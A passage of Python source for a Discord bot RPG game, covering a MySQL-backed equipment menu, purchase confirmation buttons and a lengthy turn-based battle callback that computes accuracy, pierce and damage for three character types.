                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have a Tea Bag equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'TB' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                         {'userID': interaction.user.id})

        for x in mycursor:
            equipments = []
            for equipment in x:
                if equipment == "HD":
                    equipments.append("Hidden Dagger")
                elif equipment == "SB":
                    equipments.append("Standard Blade")
                elif equipment == "O":
                    equipments.append("Ooze")
                elif equipment == "SS":
                    equipments.append("Standard Shield")
                elif equipment == "IH":
                    equipments.append("Iron Helmet")
                elif equipment == "PA":
                    equipments.append("Platinum Armour")
                elif equipment == "RN":
                    equipments.append("Rune Necklace")
                elif equipment == "MA":
                    equipments.append("Mystic Artifact")
                elif equipment == "EH":
                    equipments.append("Enchanted Headpiece")
                elif equipment == "VV":
                    equipments.append("Vital Vial")
                elif equipment == "D":
                    equipments.append("Deathspike")
                elif equipment == "TB":
                    equipments.append("Tea Bag")

            while len(equipments) < 3:
                equipments.append("None equipped")

            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`", color=embedcolor)
            embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
            embed.set_author(name=interaction.user.name, icon_url=interaction.user.avatar.url)
            embed.timestamp = discord.utils.utcnow()

            view = Equip(self.view.ctx)
            await interaction.response.edit_message(embed=embed, view=view)
            view.msg = await interaction.original_message()


class EquipDropDownView(discord.ui.View):
    def __init__(self, ctx, equipment):
        super().__init__()
        self.msg = None
        self.ctx = ctx
        self.equipment = equipment

        self.add_item(EquipDropdown())

    async def on_timeout(self):
        if self.msg:
            await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/armoury` to equip more equipment.**", color=embedcolor), view=None)


class Equip(discord.ui.View):
    def __init__(self, ctx):
        super().__init__()
        self.ctx = ctx
        self.msg = None

    @discord.ui.button(label='Change Equipment 1', style=discord.ButtonStyle.blurple)
    async def equipment1(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        view = EquipDropDownView(self.ctx, "equipment1")
        await interaction.response.edit_message(view=view)
        view.msg = await interaction.original_message()

    @discord.ui.button(label='Change Equipment 2', style=discord.ButtonStyle.blurple)
    async def equipment2(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        view = EquipDropDownView(self.ctx, "equipment2")
        await interaction.response.edit_message(view=view)
        view.msg = await interaction.original_message()

    @discord.ui.button(label='Change Equipment 3', style=discord.ButtonStyle.blurple)
    async def equipment3(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        view = EquipDropDownView(self.ctx, "equipment3")
        await interaction.response.edit_message(view=view)
        view.msg = await interaction.original_message()

    @discord.ui.button(label='Close Armoury', style=discord.ButtonStyle.red)
    async def close(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        await interaction.response.edit_message(view=self)

    async def on_timeout(self):
        if self.msg:
            await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/armoury` to equip more equipment.**", color=embedcolor), view=None)


class ConfirmPurchase(discord.ui.View):
    def __init__(self, ctx, cost, item, name):
        super().__init__()
        self.ctx = ctx
        self.cost = cost
        self.item = item
        self.name = name
        self.msg = None

    @discord.ui.button(label='Yes', style=discord.ButtonStyle.green)
    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        mycursor.execute("UPDATE Users SET {} = {} + 1, gold = gold - %(gold)s WHERE userID=%(userID)s".format(
            self.item, self.item), {'userID': interaction.user.id, 'gold': self.cost})
        mydb.commit()

        await self.msg.edit(view=self)

        await interaction.response.send_message(embed=discord.Embed(description=f"**{interaction.user.mention} has successfully bought {self.name}!**", color=embedcolor))

    @discord.ui.button(label='No', style=discord.ButtonStyle.red)
    async def cancel(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        await self.msg.edit(view=self)

        await interaction.response.send_message(embed=discord.Embed(description="**Cancelled - type `/buy <equipment>` to retry!**", color=embedcolor))

    async def on_timeout(self):
        if self.msg:
            await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/buy <equipment>` to buy equipment again!**", color=embedcolor), view=None)


class BattleDropdown(discord.ui.Select):
    def __init__(self, label1, description1, label2, description2, label3, description3, label4, description4):

        options = [
            discord.SelectOption(label=label1,
                                 description=description1, value=1),
            discord.SelectOption(label=label2,
                                 description=description2, value=2),
            discord.SelectOption(label=label3,
                                 description=description3, value=3),
            discord.SelectOption(label=label4,
                                 description=description4, value=4)
        ]

        super().__init__(placeholder='Please select a skill...',
                         min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.view.p1turn and interaction.user != self.view.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.view.ctx.author.mention}!**", color=embedcolor), ephemeral=True)
            return

        elif not self.view.p1turn and interaction.user != self.view.opponent:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.view.opponent.mention}!**", color=embedcolor), ephemeral=True)
            return

        # if its player 1s turn
        if interaction.user == self.view.ctx.author:
            if self.view.p1freakyid == "V":
                if self.values[0] == "1":
                    chancetomiss = 100 - self.view.p1lowaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p1piercepercent:

                            damage = self.view.p2defense + self.view.p2lowdefense - self.view.p1attacklow
                            if damage < 0:
                                self.view.p2health += damage
                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and did {abs(damage)} Attack Damage!**"

                            else:
                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attacklowname} with their Defense!**"

                        else:
                            self.view.p2health -= self.view.p1attacklow
                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attacklow} Attack Damage!**"

                    else:
                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attacklowname} and did no damage!**"

                elif self.values[0] == "2":
                    chancetomiss = 100 - self.view.p1highaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p1piercepercent:

                            damage = self.view.p2defense + self.view.p2highdefense - self.view.p1attackhigh
                            if damage < 0:
                                self.view.p2health += damage
                                self.view.p1health += 10
                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} dealing {abs(damage)} Attack Damage and gaining 10 Health!**"

                            else:
                                self.view.p1health += 10
                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attackhighname} with their Defense but still landed their attack and gained 10 Health!**"

                        else:
                            self.view.p2health -= self.view.p1attackhigh
                            self.view.p1health += 10
                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attackhigh} Attack Damage and gaining 10 Health!**"

                    else:
                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attackhighname} and did no damage!**"

                elif self.values[0] == "3":
                    self.view.p1lowaccuracy += 10
                    if self.view.p1lowaccuracy > 100:
                        self.view.p1lowaccuracy = 100
                    self.view.p1highaccuracy += 10
                    if self.view.p1highaccuracy > 100:
                        self.view.p1highaccuracy = 100
                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff1name} and gained 10% Accuracy for low and high attacks!**"

                elif self.values[0] == "4":
                    self.view.p1attacklow += 15
                    self.view.p1attackhigh += 15
                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff2name} and gained 15 Attack Damage for low and high attacks!**"

            elif self.view.p1freakyid == "W":
                if self.values[0] == "1":
                    chancetomiss = 100 - self.view.p1lowaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p1piercepercent:

                            damage = self.view.p2defense + self.view.p2lowdefense - self.view.p1attacklow
                            if damage < 0:
                                self.view.p2health += damage
                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and did {abs(damage)} Attack Damage!**"

                            else:
                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attacklowname} with their Defense!**"

                        else:
                            self.view.p2health -= self.view.p1attacklow
                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attacklow} Attack Damage!**"

                    else:
                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attacklowname} and did no damage!**"

                elif self.values[0] == "2":
                    chancetomiss = 100 - self.view.p1highaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p1piercepercent:

                            damage = self.view.p2defense + self.view.p2highdefense - self.view.p1attackhigh
                            if damage < 0:
                                self.view.p2health += damage
                                self.view.p1piercepercent += 5
                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} dealing {abs(damage)} Attack Damage and gaining 5% pierce chance for all attacks!**"

                            else:
                                self.view.p1piercepercent += 5
                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attackhighname} with their Defense but still landed their attack and gained 5% pierce chance for all attacks!**"

                        else:
                            self.view.p2health -= self.view.p1attackhigh
                            self.view.p1piercepercent += 5
                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attackhigh} Attack Damage and gaining 5% pierce chance for all attacks!**"

                    else:
                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attackhighname} and did no damage!**"

                elif self.values[0] == "3":
                    self.view.p1lowaccuracy += 10
                    if self.view.p1lowaccuracy > 100:
                        self.view.p1lowaccuracy = 100
                    self.view.p1highaccuracy += 10
                    if self.view.p1highaccuracy > 100:
                        self.view.p1highaccuracy = 100
                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff1name} and gained 10% Accuracy for low and high attacks!**"

                elif self.values[0] == "4":
                    self.view.p1defense += 10
                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff2name} and gained 10 Defense!**"

            elif self.view.p1freakyid == "S":
                if self.values[0] == "1":
                    chancetomiss = 100 - self.view.p1lowaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p1piercepercent:

                            damage = self.view.p2defense + self.view.p2lowdefense - self.view.p1attacklow
                            if damage < 0:
                                self.view.p2health += damage
                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and did {abs(damage)} Attack Damage!**"

                            else:
                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attacklowname} with their Defense!**"

                        else:
                            self.view.p2health -= self.view.p1attacklow
                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attacklowname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attacklow} Attack Damage!**"

                    else:
                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attacklowname} and did no damage!**"

                elif self.values[0] == "2":
                    chancetomiss = 100 - self.view.p1highaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p1piercepercent:

                            damage = self.view.p2defense + self.view.p2highdefense - self.view.p1attackhigh
                            if damage < 0:
                                self.view.p2health += damage
                                self.view.p1lowaccuracy += 20
                                if self.view.p1lowaccuracy > 100:
                                    self.view.p1lowaccuracy = 100
                                self.view.p1highaccuracy += 20
                                if self.view.p1highaccuracy > 100:
                                    self.view.p1highaccuracy = 100
                                actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} dealing {abs(damage)} Attack Damage and gaining 20% accuracy for all attacks!**"

                            else:
                                self.view.p1lowaccuracy += 20
                                if self.view.p1lowaccuracy > 100:
                                    self.view.p1lowaccuracy = 100
                                self.view.p1highaccuracy += 20
                                if self.view.p1highaccuracy > 100:
                                    self.view.p1highaccuracy = 100
                                actionperformed = f"**{self.view.opponent.mention} completely blocked {self.view.ctx.author.mention}'s {self.view.p1attackhighname} with their Defense but still landed their attack and gained 20% accuracy for all attacks!**"

                        else:
                            self.view.p2health -= self.view.p1attackhigh
                            self.view.p1lowaccuracy += 20
                            if self.view.p1lowaccuracy > 100:
                                self.view.p1lowaccuracy = 100
                            self.view.p1highaccuracy += 20
                            if self.view.p1highaccuracy > 100:
                                self.view.p1highaccuracy = 100
                            actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1attackhighname} and completely pierced through {self.view.opponent.mention}'s Defense dealing {self.view.p1attackhigh} Attack Damage and gaining 20% accuracy for all attacks!**"

                    else:
                        actionperformed = f"**{self.view.ctx.author.mention} completely missed their {self.view.p1attackhighname} and did no damage!**"

                elif self.values[0] == "3":
                    self.view.p1attacklow += 15
                    self.view.p1attackhigh += 15
                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff1name} and gained 15 Attack Damage for low and high attacks!**"

                elif self.values[0] == "4":
                    self.view.p1defense += 10
                    actionperformed = f"**{self.view.ctx.author.mention} used {self.view.p1buff2name} and gained 10 Defense!**"

            self.view.p1turn = False

            embed = discord.Embed(
                title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=actionperformed, color=embedcolor)
            embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
            embed.set_author(name=f"{self.view.opponent.display_name}'s Turn - Round {self.view.round}",
                             icon_url=self.view.opponent.avatar.url)
            embed.timestamp = discord.utils.utcnow()
            embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
            embed.add_field(name=self.view.p1freak,
                            value=f"Health \U00002764 - `{self.view.p1health}`")
            embed.add_field(name=self.view.p2freak,
                            value=f"Health \U00002764 - `{self.view.p2health}`")

            view = BattleDropDownView(self.view.ctx, self.view.opponent, self.view.p1freak, self.view.p1attacklowname, self.view.p1attackhighname, self.view.p1buff1name, self.view.p1buff2name, self.view.p1buff1description, self.view.p1buff2description, self.view.p1attacklow, self.view.p1attackhigh, self.view.p1health, self.view.p1defense, self.view.p1highdefense, self.view.p1lowdefense, self.view.p1lowaccuracy, self.view.p1highaccuracy, self.view.p1piercepercent, self.view.p1equipmentstealpercent,
                                      self.view.p1goldstealpercent, self.view.p2freak, self.view.p2attacklowname, self.view.p2attackhighname, self.view.p2buff1name, self.view.p2buff2name, self.view.p2buff1description, self.view.p2buff2description, self.view.p2attacklow, self.view.p2attackhigh, self.view.p2health, self.view.p2defense, self.view.p2highdefense, self.view.p2lowdefense, self.view.p2lowaccuracy, self.view.p2highaccuracy, self.view.p2piercepercent, self.view.p2equipmentstealpercent, self.view.p2goldstealpercent, self.view.p1turn, self.view.round, self.view.p1freakyid, self.view.p2freakyid)

            await interaction.response.edit_message(embed=embed, view=view)

            view.msg = await interaction.original_message()

        elif interaction.user == self.view.opponent:
            if self.view.p2freakyid == "V":
                if self.values[0] == "1":
                    chancetomiss = 100 - self.view.p2lowaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p2piercepercent:

                            damage = self.view.p1defense + self.view.p1lowdefense - self.view.p2attacklow
                            if damage < 0:
                                self.view.p1health += damage
                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and did {abs(damage)} Attack Damage!**"

                            else:
                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attacklowname} with their Defense!**"

                        else:
                            self.view.p1health -= self.view.p2attacklow
                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attacklow} Attack Damage!**"

                    else:
                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attacklowname} and did no damage!**"

                elif self.values[0] == "2":
                    chancetomiss = 100 - self.view.p2highaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p2piercepercent:

                            damage = self.view.p1defense + self.view.p1highdefense - self.view.p2attackhigh
                            if damage < 0:
                                self.view.p1health += damage
                                self.view.p2health += 10
                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} dealing {abs(damage)} Attack Damage and gaining 10 Health!**"

                            else:
                                self.view.p1health += 10
                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attackhighname} with their Defense but still landed their attack and gained 10 Health!**"

                        else:
                            self.view.p1health -= self.view.p2attackhigh
                            self.view.p2health += 10
                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attackhigh} Attack Damage and gaining 10 Health!**"

                    else:
                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attackhighname} and did no damage!**"

                elif self.values[0] == "3":
                    self.view.p2lowaccuracy += 10
                    if self.view.p2lowaccuracy > 100:
                        self.view.p2lowaccuracy = 100
                    self.view.p2highaccuracy += 10
                    if self.view.p2highaccuracy > 100:
                        self.view.p2highaccuracy = 100
                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff1name} and gained 10% Accuracy for low and high attacks!**"

                elif self.values[0] == "4":
                    self.view.p2attacklow += 15
                    self.view.p2attackhigh += 15
                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff2name} and gained 15 Attack Damage for low and high attacks!**"

            elif self.view.p2freakyid == "W":
                if self.values[0] == "1":
                    chancetomiss = 100 - self.view.p2lowaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p2piercepercent:

                            damage = self.view.p1defense + self.view.p1lowdefense - self.view.p2attacklow
                            if damage < 0:
                                self.view.p1health += damage
                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and did {abs(damage)} Attack Damage!**"

                            else:
                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attacklowname} with their Defense!**"

                        else:
                            self.view.p1health -= self.view.p2attacklow
                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attacklow} Attack Damage!**"

                    else:
                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attacklowname} and did no damage!**"

                elif self.values[0] == "2":
                    chancetomiss = 100 - self.view.p2highaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p2piercepercent:

                            damage = self.view.p1defense + self.view.p1highdefense - self.view.p2attackhigh
                            if damage < 0:
                                self.view.p1health += damage
                                self.view.p2piercepercent += 5
                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} dealing {abs(damage)} Attack Damage and gaining 5% pierce chance for all attacks!**"

                            else:
                                self.view.p2piercepercent += 5
                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attackhighname} with their Defense but still landed their attack and gained 5% pierce chance for all attacks!**"

                        else:
                            self.view.p1health -= self.view.p2attackhigh
                            self.view.p2piercepercent += 5
                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attackhigh} Attack Damage and gaining 5% pierce chance for all attacks!**"

                    else:
                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attackhighname} and did no damage!**"

                elif self.values[0] == "3":
                    self.view.p2lowaccuracy += 10
                    if self.view.p2lowaccuracy > 100:
                        self.view.p2lowaccuracy = 100
                    self.view.p2highaccuracy += 10
                    if self.view.p2highaccuracy > 100:
                        self.view.p2highaccuracy = 100
                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff1name} and gained 10% Accuracy for low and high attacks!**"

                elif self.values[0] == "4":
                    self.view.p2defense += 10
                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff2name} and gained 10 Defense!**"

            elif self.view.p2freakyid == "S":
                if self.values[0] == "1":
                    chancetomiss = 100 - self.view.p2lowaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p2piercepercent:

                            damage = self.view.p1defense + self.view.p1lowdefense - self.view.p2attacklow
                            if damage < 0:
                                self.view.p1health += damage
                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and did {abs(damage)} Attack Damage!**"

                            else:
                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attacklowname} with their Defense!**"

                        else:
                            self.view.p1health -= self.view.p2attacklow
                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attacklowname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attacklow} Attack Damage!**"

                    else:
                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attacklowname} and did no damage!**"

                elif self.values[0] == "2":
                    chancetomiss = 100 - self.view.p2highaccuracy
                    accuracyvalue = random.randrange(1, 101)
                    if accuracyvalue > chancetomiss:

                        piercevalue = random.randrange(1, 101)
                        if piercevalue > self.view.p2piercepercent:

                            damage = self.view.p1defense + self.view.p1highdefense - self.view.p2attackhigh
                            if damage < 0:
                                self.view.p1health += damage
                                self.view.p2lowaccuracy += 20
                                if self.view.p2lowaccuracy > 100:
                                    self.view.p2lowaccuracy = 100
                                self.view.p2highaccuracy += 20
                                if self.view.p2highaccuracy > 100:
                                    self.view.p2highaccuracy = 100
                                actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} dealing {abs(damage)} Attack Damage and gaining 20% accuracy for all attacks!**"

                            else:
                                self.view.p2lowaccuracy += 20
                                if self.view.p2lowaccuracy > 100:
                                    self.view.p2lowaccuracy = 100
                                self.view.p2highaccuracy += 20
                                if self.view.p2highaccuracy > 100:
                                    self.view.p2highaccuracy = 100
                                actionperformed = f"**{self.view.ctx.author.mention} completely blocked {self.view.opponent.mention}'s {self.view.p2attackhighname} with their Defense but still landed their attack and gained 20% accuracy for all attacks!**"

                        else:
                            self.view.p1health -= self.view.p2attackhigh
                            self.view.p2lowaccuracy += 20
                            if self.view.p2lowaccuracy > 100:
                                self.view.p2lowaccuracy = 100
                            self.view.p2highaccuracy += 20
                            if self.view.p2highaccuracy > 100:
                                self.view.p2highaccuracy = 100
                            actionperformed = f"**{self.view.opponent.mention} used {self.view.p2attackhighname} and completely pierced through {self.view.ctx.author.mention}'s Defense dealing {self.view.p2attackhigh} Attack Damage and gaining 20% accuracy for all attacks!**"

                    else:
                        actionperformed = f"**{self.view.opponent.mention} completely missed their {self.view.p2attackhighname} and did no damage!**"

                elif self.values[0] == "3":
                    self.view.p2attacklow += 15
                    self.view.p2attackhigh += 15
                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff1name} and gained 15 Attack Damage for low and high attacks!**"

                elif self.values[0] == "4":
                    self.view.p2defense += 10
                    actionperformed = f"**{self.view.opponent.mention} used {self.view.p2buff2name} and gained 10 Defense!**"

            self.view.p1turn = True
            self.view.round += 1

            p1win = None
            if self.view.p1health <= 0 and self.view.p2health <= 0:
                if self.view.p1health < self.view.p2health:
                    p1win = False
                else:
                    p1win = True
            elif self.view.p1health <= 0:
                p1win = False
            elif self.view.p2health <= 0:
                p1win = True

            if p1win == None:
                embed = discord.Embed(
                    title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=actionperformed, color=embedcolor)
                embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
                embed.set_author(name=f"{self.view.ctx.author.display_name}'s Turn - Round {self.view.round}",
                                 icon_url=self.view.ctx.author.avatar.url)
                embed.timestamp = discord.utils.utcnow()
                embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
                embed.add_field(name=self.view.p1freak,
                                value=f"Health \U00002764 - `{self.view.p1health}`")
                embed.add_field(name=self.view.p2freak,
                                value=f"Health \U00002764 - `{self.view.p2health}`")

                view = BattleDropDownView(self.view.ctx, self.view.opponent, self.view.p1freak, self.view.p1attacklowname, self.view.p1attackhighname, self.view.p1buff1name, self.view.p1buff2name, self.view.p1buff1description, self.view.p1buff2description, self.view.p1attacklow, self.view.p1attackhigh, self.view.p1health, self.view.p1defense, self.view.p1highdefense, self.view.p1lowdefense, self.view.p1lowaccuracy, self.view.p1highaccuracy, self.view.p1piercepercent, self.view.p1equipmentstealpercent,
                                          self.view.p1goldstealpercent, self.view.p2freak, self.view.p2attacklowname, self.view.p2attackhighname, self.view.p2buff1name, self.view.p2buff2name, self.view.p2buff1description, self.view.p2buff2description, self.view.p2attacklow, self.view.p2attackhigh, self.view.p2health, self.view.p2defense, self.view.p2highdefense, self.view.p2lowdefense, self.view.p2lowaccuracy, self.view.p2highaccuracy, self.view.p2piercepercent, self.view.p2equipmentstealpercent, self.view.p2goldstealpercent, self.view.p1turn, self.view.round, self.view.p1freakyid, self.view.p2freakyid)

                await interaction.response.edit_message(embed=embed, view=view)

                view.msg = await interaction.original_message()

            elif p1win:
                embed = discord.Embed(
                    title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=actionperformed+f"\n\n**{self.view.ctx.author.display_name} wins as {self.view.opponent.display_name} is no longer able to fight!**", color=embedcolor)
                embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
                embed.set_author(name=f"Congratulations {self.view.ctx.author.display_name}!",
                                 icon_url=self.view.ctx.author.avatar.url)
                embed.timestamp = discord.utils.utcnow()
                embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
                embed.add_field(name=self.view.p1freak,
                                value=f"Health \U00002764 - `{self.view.p1health}`")
                embed.add_field(name=self.view.p2freak,
                                value=f"Health \U00002764 - `{self.view.p2health}`")

                view = WinView(self.view.ctx.author, self.view.opponent,
                               self.view.p1equipmentstealpercent, self.view.p1goldstealpercent)

                await interaction.response.edit_message(embed=embed, view=view)

                view.msg = await interaction.original_message()

            elif not p1win:
                embed = discord.Embed(
                    title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=actionperformed+f"\n\n**{self.view.opponent.display_name} wins as {self.view.ctx.author.display_name} is no longer able to fight!**", color=embedcolor)
                embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
